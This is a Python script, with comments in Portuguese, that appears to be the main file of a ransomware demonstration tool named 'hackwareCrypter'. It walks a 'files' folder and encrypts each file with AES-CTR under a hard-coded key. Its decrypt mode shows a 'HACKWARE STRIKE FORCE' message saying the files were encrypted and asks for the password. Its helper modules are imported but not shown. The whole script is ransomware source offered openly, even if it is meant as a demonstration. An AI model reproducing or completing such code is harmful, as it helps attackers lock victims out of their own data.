#!/usr/bin/python3.11
# -*- coding: utf-8 -*-
from Cryptodome.Cipher import AES
from Cryptodome.Util import Counter
import argparse
import os
import hashlib
import crypter
import Discovery

# Constantes
CHAVE_FIXA = 'hackware strike force strikes u!'  # Senha fixa para demonstração

def get_parser():
    parser = argparse.ArgumentParser(description="hackwareCrypter")
    parser.add_argument(
        '-d', '--decrypt', help='Descriptografa os arquivos [default: no]', action='store_true')
    return parser

def main():
    parser = get_parser()
    args = parser.parse_args()
    decrypt = args.decrypt

    if decrypt:
        senha = CHAVE_FIXA
        print(f'''
        HACKWARE STRIKE FORCE
        -------------------------------------------------------       
        Seus arquivos foram criptografados.
        Para descriptografá-los, Coloque uma senha correta'
              ''')
        senha = input("Digite a senha> " )

    else:
        senha = CHAVE_FIXA

    chave = crypter.obter_chave(senha)

    # Carrega o nonce armazenado
    nonce = crypter.carregar_nonce()

    if nonce is None:
        if not decrypt:
            # Gera e salva um novo nonce para futuras operações de descriptografia
            nonce = os.urandom(16)
            crypter.salvar_nonce(nonce)
        else:
            print('Erro: Não foi possível carregar o nonce. Certifique-se de que o nonce foi salvo corretamente durante a criptografia.')
            return

    ctr = Counter.new(128, initial_value=int.from_bytes(nonce, byteorder='big'))
    crypt = AES.new(chave, AES.MODE_CTR, counter=ctr)

    cryptFn = crypt.decrypt if decrypt else crypt.encrypt

    # Define o caminho para a pasta 'files'
    init_path = os.path.abspath(os.path.join(os.getcwd(), 'files'))

    if not os.path.isdir(init_path):
        print(f'A pasta {init_path} não existe.')
        return

    for filename in Discovery.descobrir(init_path):
        crypter.change_files(filename, cryptFn)

    if not decrypt:
        # Salva o nonce gerado para futuras operações de descriptografia
        crypter.salvar_nonce(nonce)

if __name__ == '__main__':
    main()
